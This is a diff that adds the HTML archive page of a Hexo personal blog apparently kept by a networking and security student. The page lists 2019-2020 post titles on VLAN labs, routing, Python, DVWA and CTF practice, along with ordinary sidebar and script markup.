+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 18
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href= "/2020/07/19/漏洞/" >漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2020/03/25/链接笔记/" >链接笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2020/03/24/软件测试笔记/" >软件测试笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2020/03/14/笔试笔记/" >笔试笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2020/03/14/Python笔记/" >Python笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2020/03/12/dvwa笔记/" >'dvwa笔记'</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href= "/2020/03/11/“web安全笔记”/" >“web安全笔记”</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/攻防世界练习/" >攻防世界练习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/2019/09/29/计算机网络知识体系及知识点/" >计算机网络知识体系及知识点</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2019/07/12/实训实战总结/" >实训实战总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2019/07/04/综合实验/" >综合实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span><a class="archive-post-title" href= "/2019/07/03/静态路由实验/" >静态路由实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/03</span><a class="archive-post-title" href= "/2019/07/03/三层交换实验/" >三层交换实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2019/07/02/IRF、聚合实验/" >IRF、聚合实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2019/07/02/VLAN实验/" >VLAN 实验</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2019/06/18/Hexo-Github搭建个人博客/" >Hexo+Github搭建个人博客</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2019/06/18/photos/" >photos</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/2019/06/17/hello-world/" >Hello World</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="交换机"><span class="iconfont-archer">&#xe606;</span>交换机</span>
+    
+        <span class="sidebar-tag-name" data-tags="H3C"><span class="iconfont-archer">&#xe606;</span>H3C</span>
+    
+        <span class="sidebar-tag-name" data-tags="blog"><span class="iconfont-archer">&#xe606;</span>blog</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="VLAN"><span class="iconfont-archer">&#xe606;</span>VLAN</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="photo"><span class="iconfont-archer">&#xe606;</span>photo</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="测试"><span class="iconfont-archer">&#xe606;</span>测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="计算机网络"><span class="iconfont-archer">&#xe606;</span>计算机网络</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="路由"><span class="iconfont-archer">&#xe606;</span>路由</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="study"><span class="iconfont-archer">&#xe60a;</span>study</span>
+    
+        <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
+    
+        <span class="sidebar-category-name" data-categories="photos"><span class="iconfont-archer">&#xe60a;</span>photos</span>
+    
+        <span class="sidebar-category-name" data-categories="测试"><span class="iconfont-archer">&#xe60a;</span>测试</span>
+    
+        <span class="sidebar-category-name" data-categories="计算机网络"><span class="iconfont-archer">&#xe60a;</span>计算机网络</span>
+    
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Regenbogenlj"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
